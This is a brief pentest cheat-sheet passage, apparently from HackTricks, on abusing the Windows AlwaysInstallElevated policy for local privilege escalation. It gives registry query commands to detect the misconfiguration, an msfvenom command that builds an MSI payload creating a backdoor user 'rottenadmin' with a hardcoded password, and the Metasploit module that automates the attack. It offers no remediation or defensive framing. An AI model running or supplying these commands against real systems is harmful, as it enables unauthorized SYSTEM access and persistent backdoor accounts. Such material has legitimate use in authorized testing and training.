https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#alwaysinstallelevated
If these two registry keys are **enabled** (value is **0x1**), any user can **install** (execute) files as NT AUTHORITY\SYSTEM. `*.msi`

```powershell
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```


In other words, executing a file like ReverseShell.msi allows you to obtain a shell with System privileges.

# [Metasploit payloads](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#metasploit-payloads)

```cmd
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi # No UAC format: msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using msiexec, UAC will not be prompted
```

If you have a Meterpreter session, you can automate this technique using the module: **`exploit/windows/local/always_install_elevated`**
